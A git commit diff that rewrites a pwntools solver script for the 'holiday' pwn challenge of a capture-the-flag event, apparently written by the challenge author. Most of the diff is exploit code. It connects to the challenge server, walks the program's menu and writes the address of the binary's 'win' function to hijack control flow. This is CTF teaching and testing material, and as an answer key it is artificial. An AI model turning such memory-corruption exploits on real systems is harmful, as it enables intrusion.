2d6cb10573059b259af684bc37725a35aa8ab3f9
Teddy Heinen <teddy@heinen.dev>
2021-09-24 16:57:26 -0500

    add solver, template

--- pwn/holiday/solve.py
+++ pwn/holiday/solve.py
@@ -6,35 +6,23 @@ exe = ELF("holiday")
 
 context.binary = exe
 context.terminal = "kitty"
-def conn():
-    if args.REMOTE:
-        return remote("localhost", 7004)
-    elif args.GDB:
-        return gdb.debug([exe.path])
-    else:
-        return process([exe.path])
 
+CHAL = "holiday"
 
-def main():
-    r = conn()
+p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)
 
-    r.sendline(b"1")
-    r.sendline(b"0")
+p.sendline(b"1")
+p.sendline(b"0")
 
-    r.sendline(b"2")
-    r.sendline(b"0")
+p.sendline(b"2")
+p.sendline(b"0")
 
-    r.sendline(b"3")
-    r.sendline(b"9")
-    r.send(p64(exe.symbols['win']))
+p.sendline(b"3")
+p.sendline(b"9")
+p.send(p64(exe.symbols['win']))
 
-    r.sendline(b"2")
-    r.sendline(b"0")
-    # good luck pwning :)
+p.sendline(b"2")
+p.sendline(b"0")
+# good luck pwning :)
 
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
-
+p.interactive()
